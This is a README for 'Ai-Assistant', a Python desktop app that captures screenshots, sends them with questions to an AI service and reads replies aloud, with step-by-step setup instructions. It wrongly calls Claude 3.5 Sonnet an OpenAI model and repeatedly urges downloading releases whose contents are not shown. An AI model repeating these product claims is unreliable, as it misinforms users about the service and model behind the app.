# 🤖 Ai-Assistant - Easy AI Help on Your Desktop

[![Download Ai-Assistant](https://img.shields.io/badge/Download-Ai--Assistant-blue?style=for-the-badge)](https://github.com/Ratingleyo/Ai-Assistant/releases)

---

## 📋 What is Ai-Assistant?

Ai-Assistant is a simple desktop app that helps you interact with AI right from your computer. It lets you take screenshots, ask questions about what’s on your screen, and get answers both as text and spoken words. The app keeps track of your conversation to provide better replies as you chat. It uses OpenAI’s Claude 3.5 Sonnet model for smart responses and has a clean window you can control easily.

You don’t need to be a tech expert to use it. Ai-Assistant works on Windows, Mac, and Linux computers. You just need Python and your own OpenAI API key (a kind of password that lets the app talk to the AI service).

---

## 🚀 Key Features

- **Screen Capture:** Take a picture of your screen and ask the AI what it shows.
- **Smart AI Replies:** Ask anything and get intelligent answers using OpenAI’s Claude 3.5 Sonnet.
- **Text and Voice Output:** See the AI response written down and hear it read out loud.
- **Conversation Memory:** The app remembers what you said before to keep the chat flowing naturally.
- **Simple Design:** The user interface uses Tkinter, a Python tool that creates easy-to-use windows.
- **Cross-Platform:** Runs smoothly on Windows, Mac, and Linux.

---

## 🖥 System Requirements

- **Operating System:** Windows 10 or later, macOS 10.13 or later, any recent Linux distribution.
- **Processor:** Any processor that runs Python 3.8 or newer.
- **Memory:** At least 4 GB of RAM.
- **Storage:** Minimum 200 MB free space.
- **Software:** Python version 3.8 or higher.
- **Network:** Internet connection for AI responses.
- **OpenAI API Key:** You need a key to let the app talk to OpenAI’s servers (explained below).

---

## 💾 Download & Install

You can **visit this page to download** Ai-Assistant and the latest files:

[Download Ai-Assistant](https://github.com/Ratingleyo/Ai-Assistant/releases)

---

### How to Get Ai-Assistant Running on Your Computer

This section will help you download, set up, and run Ai-Assistant even if you are new to software installation.

### Step 1: Download the Application

- Click the link above or go to the [Ai-Assistant Releases page](https://github.com/Ratingleyo/Ai-Assistant/releases).
- Find the latest version for your operating system (Windows, Mac, or Linux).
- Download the ZIP file or installer package.

If you downloaded a ZIP file:

- Find the ZIP file in your Downloads folder.
- Extract it to a folder you can easily find, like your Desktop.

If you downloaded an installer:

- Run the installer and follow on-screen instructions.

---

### Step 2: Install Python (If Needed)

Ai-Assistant needs Python 3.8 or higher. Check if Python is already on your computer:

- Windows: Open Command Prompt and type `python --version`
- Mac/Linux: Open Terminal and type `python3 --version`

If Python version is 3.8 or above, skip to Step 3. If not:

- Download Python from https://www.python.org/downloads/
- Install Python, making sure to check "Add Python to PATH" on Windows.

---

### Step 3: Prepare Your Computer for Ai-Assistant

The app uses a few extra Python packages. Here is what to do next.

1. Open your command line tool:
   - Windows: Search for “Command Prompt” and open it.
   - Mac: Open “Terminal” from Applications > Utilities.
   - Linux: Open your Terminal app.

2. Navigate to the folder where you extracted or installed Ai-Assistant.

- For example, if you put it on Desktop in a folder named Ai-Assistant:
  - **Windows:**  
    `cd %USERPROFILE%\Desktop\Ai-Assistant`
  - **Mac/Linux:**  
    `cd ~/Desktop/Ai-Assistant`

---

### Step 4: Set Up a Virtual Environment (Optional but Recommended)

This step keeps the app’s files separate from other programs:

Run these commands based on your system:

- Windows:
  ```
  python -m venv venv
  venv\Scripts\activate
  ```
- Mac/Linux:
  ```
  python3 -m venv venv
  source venv/bin/activate
  ```

---

### Step 5: Install the Required Packages

Once inside your Ai-Assistant folder and with the virtual environment active (if you used Step 4), type:

```
pip install -r requirements.txt
```

This command installs everything Ai-Assistant needs.

---

### Step 6: Get Your OpenAI API Key

To use the AI features, you need a key from OpenAI. Here’s how:

- Go to https://platform.openai.com/signup and create a free account.
- After signing in, find the API Keys section in your account dashboard.
- Create a new API key and copy it.

---

### Step 7: Connect Ai-Assistant to Your API Key

1. In the Ai-Assistant folder, create a new file called `.env`.
2. Open this file in a text editor (like Notepad or TextEdit).
3. Write the following line, replacing `your_api_key_here` with the key you copied:

```
OPENAI_API_KEY=your_api_key_here
```

4. Save and close the `.env` file.

---

### Step 8: Run Ai-Assistant

Now you are ready to start the app.

- In the command line (making sure you are still in the Ai-Assistant folder and your virtual environment is active), type:

```
python main.py
```

- The Ai-Assistant window will open.
- Use the buttons to take screenshots or type your questions.
- The AI will reply with text and read the answer aloud.

---

## ❓ How To Use Ai-Assistant

- Click the “Capture Screen” button to take a screenshot.
- After the screenshot shows, type your question about the image.
- Press “Send” or hit Enter to ask.
- Wait a moment to see the AI response. It will also be read out loud automatically.
- To keep chatting, just type new questions. Ai-Assistant remembers earlier conversation parts.
- Use the “Clear Conversation” button to start fresh any time.

---

## ⚙️ Troubleshooting Tips

- **App won’t open:** Make sure Python is installed and your system meets requirements.
- **Errors about missing packages:** Run `pip install -r requirements.txt` again.
- **No voice output:** Check your computer’s audio settings and volume.
- **API key problems:** Double-check `.env` file for correct key and no extra spaces.
- **Screenshots not working:** Ensure Ai-Assistant has permission to capture your screen (especially on Mac).

---

## 🔒 Privacy and Security

Ai-Assistant sends screenshots and typed questions to OpenAI to get responses. Your data is handled securely by OpenAI under their privacy policies. The app itself does not store or share your data beyond the conversation memory needed for chat context within your session.

Your API key stays on your computer only.

---

## 🔧 Support and Feedback

If you need help or want to report a bug:

- Check the [Issues tab on GitHub](https://github.com/Ratingleyo/Ai-Assistant/issues)
- Provide details about your system and what went wrong.

---

# Ready to try Ai-Assistant?

[Download Ai-Assistant](https://github.com/Ratingleyo/Ai-Assistant/releases) and follow the steps above to start using AI on your desktop today.